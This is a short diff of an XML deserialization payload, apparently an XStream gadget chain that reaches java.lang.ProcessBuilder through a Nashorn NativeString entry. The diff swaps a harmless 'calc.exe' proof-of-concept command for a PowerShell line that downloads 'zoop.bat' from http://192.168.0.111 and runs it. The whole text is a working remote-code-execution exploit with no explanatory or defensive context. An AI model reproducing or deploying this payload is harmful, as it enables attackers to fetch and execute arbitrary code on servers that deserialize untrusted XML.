@@ -1,4 +1,3 @@
- 
 <map>
     <entry>
         <jdk.nashorn.internal.objects.NativeString>
@@ -15,9 +14,7 @@
                                         <iter class="java.util.Collections$EmptyIterator"/>
                                         <next class="java.lang.ProcessBuilder">
                                             <command>
-                                                <string>cmd.exe</string>
-                                                <string>/c</string>
-                                                <string>calc.exe</string>
+                                                <string>powershell</string><string>(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.111/zoop.bat','zoop.bat');</string><string>Start-Process 'zoop.bat'</string>
                                             </command>
                                             <redirectErrorStream>false</redirectErrorStream>
                                         </next>
